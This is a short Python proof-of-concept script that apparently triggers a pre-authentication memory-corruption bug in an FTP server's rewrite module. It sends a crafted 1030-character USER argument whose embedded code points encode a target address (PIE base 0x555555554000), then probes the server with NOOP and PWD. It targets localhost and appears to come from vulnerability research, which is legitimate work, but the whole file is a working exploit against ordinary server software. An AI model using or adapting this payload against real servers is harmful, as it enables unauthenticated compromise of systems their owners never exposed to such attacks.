#!/usr/bin/env python3
"""Unauthenticated rewrite trigger: long USER argument, no PASS.

Uses the same 1030-code-point payload as client4.py. rewrite_fixup() is a
PRE_CMD handler for C_ANY, so a `RewriteCondition %m USER` config reaches the
map before login. Target marker is the same 'NOOP command successful' .rodata
string under setarch -R (PIE base 0x555555554000).
"""
import socket
import time

host, port = "127.0.0.1", 21884
for _ in range(40):
    try:
        s = socket.create_connection((host, port), 1)
        s.close()
        break
    except OSError:
        time.sleep(0.25)

tail = ["\u00af", "\u01d4", "`", "U", "U", "U"]  # af d4 60 55 55 55
cps = ["A"] * 1030
for k, ch in enumerate(tail):
    cps[8 * k] = ch
key = "".join(cps)
assert len(key) == 1030
print("KEY_CODEPOINTS=%d KEY_BYTES=%d" % (len(key), len(key.encode("utf-8"))))

s = socket.create_connection((host, port), 8)
s.settimeout(8)


def recv(label):
    try:
        data = s.recv(4096)
        print(label + " " + repr(data[:200]))
        return data
    except Exception as exc:
        print(label + "_FAIL " + type(exc).__name__ + ": " + str(exc)[:120])
        return b""


recv("BANNER")
s.sendall(b"USER " + key.encode("utf-8") + b"\r\n")
recv("USER_REPLY")
s.sendall(b"NOOP\r\n")
recv("NOOP_REPLY")
s.sendall(b"PWD\r\n")
recv("PWD_REPLY")
s.close()
